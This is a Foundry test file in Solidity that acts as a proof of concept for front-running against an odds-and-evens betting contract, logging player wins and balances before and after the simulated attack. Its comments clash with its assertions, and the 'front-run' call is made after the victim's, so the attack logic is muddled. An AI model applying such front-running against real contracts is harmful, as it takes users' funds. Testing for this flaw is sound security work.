// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/odds_and_evens.sol";
import {console2} from "forge-std/console2.sol"; // Add console2 for explicit logging

contract OddsAndEvensTest is Test {
    OddsAndEvens game;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address attacker = address(0x4);

    function setUp() public {
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(attacker, 10 ether);
        
        vm.prank(owner);
        game = new OddsAndEvens();
    }

    function testFrontRunningVulnerability() public {
        // Alice plays the game normally
        vm.prank(alice);
        game.play{value: 1 ether}(1); // Alice chooses odd number

        // Bob sees Alice's transaction in mempool and front-runs it
        vm.prank(bob);
        game.play{value: 1 ether}(1); // Bob chooses same number as Alice to guarantee win

        // Check that Bob won (since same numbers sum to even, first player wins)
        (uint aliceWins, ) = game.getPlayerStats(alice);
        (uint bobWins, ) = game.getPlayerStats(bob);
        
        assertEq(aliceWins, 1, "Alice should have won");
        assertEq(bobWins, 0, "Bob should not have won");

        // Now simulate attacker front-running scenario
        // Reset game state
        vm.prank(owner);
        game = new OddsAndEvens();

        // Log pre-trigger state for Alice and attacker
        console2.log("--- BEFORE-Trigger Attack ---");
        (uint aliceWinsBefore, ) = game.getPlayerStats(alice);
        (uint attackerWinsBefore, ) = game.getPlayerStats(attacker);
        uint aliceBalanceBefore = address(alice).balance;
        uint attackerBalanceBefore = address(attacker).balance;

        console2.log("Alice wins before:", aliceWinsBefore);
        console2.log("Attacker wins before:", attackerWinsBefore);
        console2.log("Alice balance before:", aliceBalanceBefore);
        console2.log("Attacker balance before:", attackerBalanceBefore);

        // Alice plays (transaction for attacker to front-run)
        vm.prank(alice);
        game.play{value: 1 ether}(2); // Alice chooses even number
        
        console2.log("--- Trigger Attack (Attacker front-runs) ---");
        vm.txGasPrice(1000 gwei);
        vm.prank(attacker);
        game.play{value: 1 ether}(1); // Attacker front-runs Alice

        console2.log("--- AFTER-Trigger Attack ---");
        (uint aliceWinsAfter, ) = game.getPlayerStats(alice);
        (uint attackerWinsAfter, ) = game.getPlayerStats(attacker);
        uint aliceBalanceAfter = address(alice).balance;
        uint attackerBalanceAfter = address(attacker).balance;

        console2.log("Alice wins after:", aliceWinsAfter);
        console2.log("Attacker wins after:", attackerWinsAfter);
        console2.log("Alice balance after:", aliceBalanceAfter);
        console2.log("Attacker balance after:", attackerBalanceAfter);

        console2.log("--- Comparison Results ---");
        bool winsChanged = (attackerWinsAfter > attackerWinsBefore) && (aliceWinsAfter == aliceWinsBefore);

        if (winsChanged) {
            console2.log("STATE CHANGES: Attacker win count increased -> Vulnerability exists");
            console2.log("Vulnerability Exists: Attacker successfully manipulated game outcome via front-running");
        } else {
            console2.log("NO SIGNIFICANT STATE CHANGES: Vulnerability not triggered");
            console2.log("Vulnerability not Exist: Front-running attack did not increase attacker's win count");
        }
    }
}